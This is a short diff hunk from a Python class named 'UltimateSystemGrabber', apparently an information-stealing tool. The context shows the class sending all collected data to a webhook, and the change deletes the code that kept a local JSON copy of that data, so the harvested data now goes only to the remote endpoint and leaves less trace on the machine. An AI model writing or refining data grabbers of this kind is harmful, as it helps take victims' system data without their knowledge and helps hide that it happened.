@@ -522,11 +522,6 @@ class UltimateSystemGrabber:
         
         self.send_to_webhook(self.all_data)
         
-        # Save local copy
-        output_file = f"full_grab_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-        with open(output_file, 'w', encoding='utf-8') as f:
-            json.dump(self.all_data, f, indent=2, default=str)
-        
         return self.all_data
 
 # ==================== GRAPHICAL USER INTERFACE ====================
